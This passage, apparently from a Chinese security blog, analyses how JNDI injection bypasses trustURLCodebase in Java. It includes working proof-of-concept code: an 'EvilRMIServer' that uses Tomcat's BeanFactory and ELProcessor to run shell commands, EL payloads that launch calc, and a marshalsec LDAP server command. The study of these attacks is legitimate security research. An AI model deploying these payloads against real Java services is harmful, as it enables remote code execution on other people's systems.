</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span> <span style=color:#00a8c8>else</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>beanClass</span> <span style=color:#f92672>=</span> <span style=color:#111>Class</span><span style=color:#f92672>.</span><span style=color:#75af00>forName</span><span style=color:#f92672>(</span><span style=color:#111>beanClassName</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// 2. 初始化类实例
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#111>Object</span> <span style=color:#111>bean</span> <span style=color:#f92672>=</span> <span style=color:#111>beanClass</span><span style=color:#f92672>.</span><span style=color:#75af00>getConstructor</span><span style=color:#f92672>().</span><span style=color:#75af00>newInstance</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// 3. 根据 Reference 的属性查找 setter 方法的别名
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#111>RefAddr</span> <span style=color:#111>ra</span> <span style=color:#f92672>=</span> <span style=color:#111>ref</span><span style=color:#f92672>.</span><span style=color:#75af00>get</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;forceString&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#111>String</span> <span style=color:#111>value</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>String</span><span style=color:#f92672>)</span><span style=color:#111>ra</span><span style=color:#f92672>.</span><span style=color:#75af00>getContent</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// 4. 循环解析别名并保存到字典中
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#00a8c8>for</span> <span style=color:#f92672>(</span><span style=color:#111>String</span> <span style=color:#111>param</span><span style=color:#f92672>:</span> <span style=color:#111>value</span><span style=color:#f92672>.</span><span style=color:#75af00>split</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;,&#34;</span><span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>param</span> <span style=color:#f92672>=</span> <span style=color:#111>param</span><span style=color:#f92672>.</span><span style=color:#75af00>trim</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>index</span> <span style=color:#f92672>=</span> <span style=color:#111>param</span><span style=color:#f92672>.</span><span style=color:#75af00>indexOf</span><span style=color:#f92672>(</span><span style=color:#d88200>&#39;=&#39;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>if</span> <span style=color:#f92672>(</span><span style=color:#111>index</span> <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>0</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#111>setterName</span> <span style=color:#f92672>=</span> <span style=color:#111>param</span><span style=color:#f92672>.</span><span style=color:#75af00>substring</span><span style=color:#f92672>(</span><span style=color:#111>index</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span><span style=color:#f92672>).</span><span style=color:#75af00>trim</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            <span style=color:#111>param</span> <span style=color:#f92672>=</span> <span style=color:#111>param</span><span style=color:#f92672>.</span><span style=color:#75af00>substring</span><span style=color:#f92672>(</span><span style=color:#ae81ff>0</span><span style=color:#f92672>,</span> <span style=color:#111>index</span><span style=color:#f92672>).</span><span style=color:#75af00>trim</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#00a8c8>else</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#111>setterName</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;set&#34;</span> <span style=color:#f92672>+</span>
</span></span><span style=display:flex><span>                <span style=color:#111>param</span><span style=color:#f92672>.</span><span style=color:#75af00>substring</span><span style=color:#f92672>(</span><span style=color:#ae81ff>0</span><span style=color:#f92672>,</span> <span style=color:#ae81ff>1</span><span style=color:#f92672>).</span><span style=color:#75af00>toUpperCase</span><span style=color:#f92672>(</span><span style=color:#111>Locale</span><span style=color:#f92672>.</span><span style=color:#75af00>ENGLISH</span><span style=color:#f92672>)</span> <span style=color:#f92672>+</span>
</span></span><span style=display:flex><span>                <span style=color:#111>param</span><span style=color:#f92672>.</span><span style=color:#75af00>substring</span><span style=color:#f92672>(</span><span style=color:#ae81ff>1</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>        <span style=color:#111>forced</span><span style=color:#f92672>.</span><span style=color:#75af00>put</span><span style=color:#f92672>(</span><span style=color:#111>param</span><span style=color:#f92672>,</span> <span style=color:#111>beanClass</span><span style=color:#f92672>.</span><span style=color:#75af00>getMethod</span><span style=color:#f92672>(</span><span style=color:#111>setterName</span><span style=color:#f92672>,</span> <span style=color:#111>paramTypes</span><span style=color:#f92672>));</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// 5. 解析所有属性，并根据别名去调用 setter 方法
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#111>Enumeration</span><span style=color:#f92672>&lt;</span><span style=color:#111>RefAddr</span><span style=color:#f92672>&gt;</span> <span style=color:#111>e</span> <span style=color:#f92672>=</span> <span style=color:#111>ref</span><span style=color:#f92672>.</span><span style=color:#75af00>getAll</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>while</span> <span style=color:#f92672>(</span><span style=color:#111>e</span><span style=color:#f92672>.</span><span style=color:#75af00>hasMoreElements</span><span style=color:#f92672>())</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>ra</span> <span style=color:#f92672>=</span> <span style=color:#111>e</span><span style=color:#f92672>.</span><span style=color:#75af00>nextElement</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>String</span> <span style=color:#111>propName</span> <span style=color:#f92672>=</span> <span style=color:#111>ra</span><span style=color:#f92672>.</span><span style=color:#75af00>getType</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>String</span> <span style=color:#111>value</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>String</span><span style=color:#f92672>)</span><span style=color:#111>ra</span><span style=color:#f92672>.</span><span style=color:#75af00>getContent</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Object</span><span style=color:#f92672>[]</span> <span style=color:#111>valueArray</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Object</span><span style=color:#f92672>[</span><span style=color:#ae81ff>1</span><span style=color:#f92672>];</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Method</span> <span style=color:#111>method</span> <span style=color:#f92672>=</span> <span style=color:#111>forced</span><span style=color:#f92672>.</span><span style=color:#75af00>get</span><span style=color:#f92672>(</span><span style=color:#111>propName</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>if</span> <span style=color:#f92672>(</span><span style=color:#111>method</span> <span style=color:#f92672>!=</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#111>valueArray</span><span style=color:#f92672>[</span><span style=color:#ae81ff>0</span><span style=color:#f92672>]</span> <span style=color:#f92672>=</span> <span style=color:#111>value</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>            <span style=color:#111>method</span><span style=color:#f92672>.</span><span style=color:#75af00>invoke</span><span style=color:#f92672>(</span><span style=color:#111>bean</span><span style=color:#f92672>,</span> <span style=color:#111>valueArray</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// ...
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>上面注释标注了关键的部分，我们可以通过在返回给客户端的 <code>Reference</code> 对象的 <code>forceString</code> 字段指定 <code>setter</code> 方法的别名，并在后续初始化过程中进行调用。<code>forceString</code> 的格式为 <code>a=foo,bar</code>，以逗号分隔每个需要设置的属性，如果包含等号，则对应的 <code>setter</code> 方法为等号后的值 <code>foo</code>，如果不包含等号，则 <code>setter</code> 方法为默认值 <code>setBar</code></p><p>在后续调用时，调用 <code>setter</code> 方法使用单个参数，且参数值为对应属性对象 <code>RefAddr</code> 的值 (<code>getContent</code>)。因此，实际上我们可以调用任意指定类的任意方法，并指定单个可控的参数（RCE的调用函数的点）</p><p>因为使用 <code>newInstance</code>创建实例（也就是后面<code>Poc</code>中的<code>ELProcessor</code>），所以只能调用无参构造，这就要求目标 <code>class</code> 得有无参构造方法，上面 <code>forceString</code> 可以给属性强制指定一个 <code>setter</code> 方法，参数为一个 <code>String</code> 类型</p><p>于是找到 <code>javax.el.ELProcessor</code> 作为目标 <code>class</code>，利用 <code>el</code> 表达式执行命令，工具 <a href=https://github.com/welk1n/JNDI-Injection-Bypass>JNDI-Injection-Bypass</a> 中的 <code>EvilRMIServer.java</code> 部分代码如下</p><p><img src=https://storage.tttang.com/media/attachment/2022/05/25/5b518569-640f-4972-bb40-3e6395f31974.png alt=zongjie3.png></p><p>所以整个绕过流程就是：
为了绕过<code>ConfigurationException</code>，需要满足<code>ref.getFactoryClassLocation()</code> 为空，只需要在远程 <code>RMI</code> 服务器返回的 <code>Reference</code> 对象中不指定 <code>Factory</code> 的 <code>codebase</code></p><p>来到<code>NamingManager</code>，需要在攻击者本地<code>CLASSPATH</code>找到这个<code>Reference Factory</code>类并且在其中一块代码能执行<code>payload</code>，找到了<code>BeanFactory</code>作为工厂类，<code>BeanFactor</code>使用<code>newInstance</code>创建实例，所以只能调用无参构造，这就要求目标 <code>class</code> 得有无参构造方法且有办法执行相关命令，于是找到<code>ELProcessor</code>和<code>GroovyShell</code></p><p>**总结：**绕过了<code>ConfigurationException</code>，进入<code>NamingManager</code>，使用<code>BeanFactor</code>创建<code>ELProcessor</code>/<code>GroovyShell</code>无参实例，然后<code>BeanFactor</code>根据别名去调用方法（执行<code>ELProcessor</code>中的<code>eval</code>方法）</p><p><strong>从JNDI_Injection_Bypass看另一种绕过方式：</strong></p><p><code>groovy.lang.GroovyShell</code>，原理也是类似的
<img src=https://storage.tttang.com/media/attachment/2022/05/25/93428660-6110-414b-9e97-455163b504fb.png alt=zongjie4.png></p><p>传入的 <code>Reference</code>为 <code>ResourceRef</code> 类，后面通过反射的方式实例化 <code>Reference</code> 所指向的任意 <code>Bean Class</code>，调用 <code>setter</code> 方法为所有的属性赋值，该 <code>Bean Class</code> 的类名、属性、属性值，全都来自于 <code>Reference</code> 对象。<code>ResourceRef</code>构造器的第七个参数<code>factoryLocation</code>是远程加载<code>factory</code>的地址，比如是一个<code>url</code>,这里将其设置为<code>null</code>,达到绕过<code>ConfigurationException</code>限制</p><h4 id=poc>poc</h4><p>因为要使用 <code>javax.el.ELProcessor</code>，所以需要 <code>Tomcat 8+</code>或<code>SpringBoot 1.2.x+</code></p><p>服务端：</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>com.sun.jndi.rmi.registry.ReferenceWrapper</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.naming.ResourceRef</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>javax.naming.StringRefAddr</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.rmi.registry.LocateRegistry</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.rmi.registry.Registry</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>class</span> <span style=color:#75af00>EvilRMIServer</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>static</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>main</span><span style=color:#f92672>(</span><span style=color:#111>String</span><span style=color:#f92672>[]</span> <span style=color:#111>args</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>Exception</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>System</span><span style=color:#f92672>.</span><span style=color:#75af00>out</span><span style=color:#f92672>.</span><span style=color:#75af00>println</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;[*]Evil RMI Server is Listening on port: 6666&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Registry</span> <span style=color:#111>registry</span> <span style=color:#f92672>=</span> <span style=color:#111>LocateRegistry</span><span style=color:#f92672>.</span><span style=color:#75af00>createRegistry</span><span style=color:#f92672>(</span> <span style=color:#ae81ff>6666</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#111>ResourceRef</span> <span style=color:#111>ref</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ResourceRef</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;javax.el.ELProcessor&#34;</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;&#34;</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;&#34;</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>true</span><span style=color:#f92672>,</span><span style=color:#d88200>&#34;org.apache.naming.factory.BeanFactory&#34;</span><span style=color:#f92672>,</span><span style=color:#00a8c8>null</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 强制将&#39;x&#39;属性的setter从&#39;setX&#39;变为&#39;eval&#39;, 详细逻辑见BeanFactory.getObjectInstance代码
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#111>ref</span><span style=color:#f92672>.</span><span style=color:#75af00>add</span><span style=color:#f92672>(</span><span style=color:#00a8c8>new</span> <span style=color:#111>StringRefAddr</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;forceString&#34;</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;x=eval&#34;</span><span style=color:#f92672>));</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 利用表达式执行命令
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#111>ref</span><span style=color:#f92672>.</span><span style=color:#75af00>add</span><span style=color:#f92672>(</span><span style=color:#00a8c8>new</span> <span style=color:#111>StringRefAddr</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;x&#34;</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;\&#34;\&#34;.getClass().forName(\&#34;javax.script.ScriptEngineManager\&#34;).newInstance().getEngineByName(\&#34;JavaScript\&#34;).eval(\&#34;new java.lang.ProcessBuilder[&#39;(java.lang.String[])&#39;]([&#39;/bin/bash&#39;, &#39;-c&#39;, &#39;touch /tmp/mi1k7ea&#39;]).start()\&#34;)&#34;</span><span style=color:#f92672>));</span>
</span></span><span style=display:flex><span>        <span style=color:#111>System</span><span style=color:#f92672>.</span><span style=color:#75af00>out</span><span style=color:#f92672>.</span><span style=color:#75af00>println</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;[*]Evil command: touch /tmp/mi1k7ea&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>ReferenceWrapper</span> <span style=color:#111>referenceWrapper</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>com</span><span style=color:#f92672>.</span><span style=color:#75af00>sun</span><span style=color:#f92672>.</span><span style=color:#75af00>jndi</span><span style=color:#f92672>.</span><span style=color:#75af00>rmi</span><span style=color:#f92672>.</span><span style=color:#75af00>registry</span><span style=color:#f92672>.</span><span style=color:#75af00>ReferenceWrapper</span><span style=color:#f92672>(</span><span style=color:#111>ref</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>registry</span><span style=color:#f92672>.</span><span style=color:#75af00>bind</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;Object&#34;</span><span style=color:#f92672>,</span> <span style=color:#111>referenceWrapper</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>服务端2</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>javax.el.ELProcessor</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>class</span> <span style=color:#75af00>Test</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>static</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>main</span><span style=color:#f92672>(</span><span style=color:#111>String</span><span style=color:#f92672>[]</span> <span style=color:#111>args</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>String</span> <span style=color:#111>poc</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;&#39;&#39;.getClass().forName(&#39;javax.script.ScriptEngineManager&#39;)&#34;</span> <span style=color:#f92672>+</span>
</span></span><span style=display:flex><span>                <span style=color:#d88200>&#34;.newInstance().getEngineByName(&#39;nashorn&#39;)&#34;</span> <span style=color:#f92672>+</span>
</span></span><span style=display:flex><span>                <span style=color:#d88200>&#34;.eval(\&#34;s=[3];s[0]=&#39;cmd&#39;;s[1]=&#39;/C&#39;;s[2]=&#39;calc&#39;;java.lang.Runtime.getRuntime().exec(s);\&#34;)&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>//        String poc = &#34;&#39;&#39;.getClass().forName(&#39;java.lang.Runtime&#39;).getMethod(&#39;exec&#39;,&#39;&#39;.getClass())&#34; +
</span></span></span><span style=display:flex><span><span style=color:#75715e>//                &#34;.invoke(&#39;&#39;.getClass().forName(&#39;java.lang.Runtime&#39;).getMethod(&#39;getRuntime&#39;)&#34; +
</span></span></span><span style=display:flex><span><span style=color:#75715e>//                &#34;.invoke(null),&#39;calc.exe&#39;)}&#34;;
</span></span></span><span style=display:flex><span><span style=color:#75715e>//        String poc = &#34;&#39;&#39;.getClass().forName(&#39;javax.script.ScriptEngineManager&#39;)&#34; +
</span></span></span><span style=display:flex><span><span style=color:#75715e>//                &#34;.newInstance().getEngineByName(&#39;JavaScript&#39;)&#34; +
</span></span></span><span style=display:flex><span><span style=color:#75715e>//                &#34;.eval(\&#34;java.lang.Runtime.getRuntime().exec(&#39;calc&#39;)\&#34;)&#34;;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#00a8c8>new</span> <span style=color:#111>ELProcessor</span><span style=color:#f92672>().</span><span style=color:#75af00>eval</span><span style=color:#f92672>(</span><span style=color:#111>poc</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>客户端：</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>javax.naming.Context</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>javax.naming.InitialContext</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>class</span> <span style=color:#75af00>Client</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>static</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>main</span><span style=color:#f92672>(</span><span style=color:#111>String</span><span style=color:#f92672>[]</span> <span style=color:#111>args</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>Exception</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>String</span> <span style=color:#111>uri</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;rmi://localhost:6666/Object&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Context</span> <span style=color:#111>ctx</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>InitialContext</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>ctx</span><span style=color:#f92672>.</span><span style=color:#75af00>lookup</span><span style=color:#f92672>(</span><span style=color:#111>uri</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><h2 id=ldap-1>LDAP</h2><h3 id=低版本-1>低版本</h3><p>我们可以通过<code>LDAP</code>服务来绕过<code>URLCodebase</code>实现远程加载，<code>LDAP</code>服务也能返回<code>JNDI Reference</code>对象，利用过程与<code>jndi</code> + <code>RMI Reference</code>基本一致，不同的是，<code>LDAP</code>服务中<code>lookup</code>方法中指定的远程地址使用的是<code>LDAP</code>协议，由攻击者控制<code>LDAP</code>服务端返回一个恶意<code>jndi Reference</code>对象，并且<code>LDAP</code>服务的<code>Reference</code>远程加载<code>Factory</code>类并不是使用<code>RMI Class Loader</code>机制，因此不受<code>trustURLCodebase</code>限制。</p><p>可以使用<code>marshalsec</code>开启<code>LDAP</code>服务</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8000/<span style=color:#8045ff>\#</span>EvilClass
</span></span></code></pre></div><p><code>LADP</code>服务前面的调用流程和<code>jndi</code>是基本一样，从<code>Obj</code>类的<code>decodeObject</code>方法这里就有些不太一样了，<code>decodeObject</code>方法内部调用了<code>decodeReference</code>方法
跟进<code>com.sun.jndi.ldap.Obj.java#decodeObject</code>，按照该函数的注释来看，其主要功能是解码从<code>LDAP Server</code>来的对象，该对象可能是序列化的对象，也可能是一个<code>Reference</code>对象。关于序列化对象的处理，我们看后面一节。这里摘取了<code>Reference</code>的处理方式：</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#00a8c8>static</span> <span style=color:#111>Object</span> <span style=color:#75af00>decodeObject</span><span style=color:#f92672>(</span><span style=color:#111>Attributes</span> <span style=color:#111>var0</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>NamingException</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#111>String</span><span style=color:#f92672>[]</span> <span style=color:#111>var2</span> <span style=color:#f92672>=</span> <span style=color:#111>getCodebases</span><span style=color:#f92672>(</span><span style=color:#111>var0</span><span style=color:#f92672>.</span><span style=color:#75af00>get</span><span style=color:#f92672>(</span><span style=color:#111>JAVA_ATTRIBUTES</span><span style=color:#f92672>[</span><span style=color:#ae81ff>4</span><span style=color:#f92672>]));</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Attribute</span> <span style=color:#111>var1</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>if</span> <span style=color:#f92672>((</span><span style=color:#111>var1</span> <span style=color:#f92672>=</span> <span style=color:#111>var0</span><span style=color:#f92672>.</span><span style=color:#75af00>get</span><span style=color:#f92672>(</span><span style=color:#111>JAVA_ATTRIBUTES</span><span style=color:#f92672>[</span><span style=color:#ae81ff>1</span><span style=color:#f92672>]))</span> <span style=color:#f92672>!=</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#111>ClassLoader</span> <span style=color:#111>var3</span> <span style=color:#f92672>=</span> <span style=color:#111>helper</span><span style=color:#f92672>.</span><span style=color:#75af00>getURLClassLoader</span><span style=color:#f92672>(</span><span style=color:#111>var2</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>return</span> <span style=color:#111>deserializeObject</span><span style=color:#f92672>((</span><span style=color:#00a8c8>byte</span><span style=color:#f92672>[])((</span><span style=color:#00a8c8>byte</span><span style=color:#f92672>[])</span><span style=color:#111>var1</span><span style=color:#f92672>.</span><span style=color:#75af00>get</span><span style=color:#f92672>()),</span> <span style=color:#111>var3</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#00a8c8>else</span> <span style=color:#00a8c8>if</span> <span style=color:#f92672>((</span><span style=color:#111>var1</span> <span style=color:#f92672>=</span> <span style=color:#111>var0</span><span style=color:#f92672>.</span><span style=color:#75af00>get</span><span style=color:#f92672>(</span><span style=color:#111>JAVA_ATTRIBUTES</span><span style=color:#f92672>[</span><span style=color:#ae81ff>7</span><span style=color:#f92672>]))</span> <span style=color:#f92672>!=</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>return</span> <span style=color:#111>decodeRmiObject</span><span style=color:#f92672>((</span><span style=color:#111>String</span><span style=color:#f92672>)</span><span style=color:#111>var0</span><span style=color:#f92672>.</span><span style=color:#75af00>get</span><span style=color:#f92672>(</span><span style=color:#111>JAVA_ATTRIBUTES</span><span style=color:#f92672>[</span><span style=color:#ae81ff>2</span><span style=color:#f92672>]).</span><span style=color:#75af00>get</span><span style=color:#f92672>(),</span> <span style=color:#f92672>(</span><span style=color:#111>String</span><span style=color:#f92672>)</span><span style=color:#111>var1</span><span style=color:#f92672>.</span><span style=color:#75af00>get</span><span style=color:#f92672>(),</span> <span style=color:#111>var2</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#00a8c8>else</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#111>var1</span> <span style=color:#f92672>=</span> <span style=color:#111>var0</span><span style=color:#f92672>.</span><span style=color:#75af00>get</span><span style=color:#f92672>(</span><span style=color:#111>JAVA_ATTRIBUTES</span><span style=color:#f92672>[</span><span style=color:#ae81ff>0</span><span style=color:#f92672>]);</span>
</span></span><span style=display:flex><span><span style=color:#75715e>//调用了decodeReference方法
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#00a8c8>return</span> <span style=color:#111>var1</span> <span style=color:#f92672>==</span> <span style=color:#00a8c8>null</span> <span style=color:#f92672>||</span> <span style=color:#f92672>!</span><span style=color:#111>var1</span><span style=color:#f92672>.</span><span style=color:#75af00>contains</span><span style=color:#f92672>(</span><span style=color:#111>JAVA_OBJECT_CLASSES</span><span style=color:#f92672>[</span><span style=color:#ae81ff>2</span><span style=color:#f92672>])</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span><span style=color:#111>var1</span><span style=color:#f92672>.</span><span style=color:#75af00>contains</span><span style=color:#f92672>(</span><span style=color:#111>JAVA_OBJECT_CLASSES_LOWER</span><span style=color:#f92672>[</span><span style=color:#ae81ff>2</span><span style=color:#f92672>])</span> <span style=color:#f92672>?</span> <span style=color:#00a8c8>null</span> <span style=color:#f92672>:</span> <span style=color:#111>decodeReference</span><span style=color:#f92672>(</span><span style=color:#111>var0</span><span style=color:#f92672>,</span> <span style=color:#111>var2</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#f92672>(</span><span style=color:#111>IOException</span> <span style=color:#111>var5</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>NamingException</span> <span style=color:#111>var4</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>NamingException</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>var4</span><span style=color:#f92672>.</span><span style=color:#75af00>setRootCause</span><span style=color:#f92672>(</span><span style=color:#111>var5</span><span style=color:#f92672>);</span>
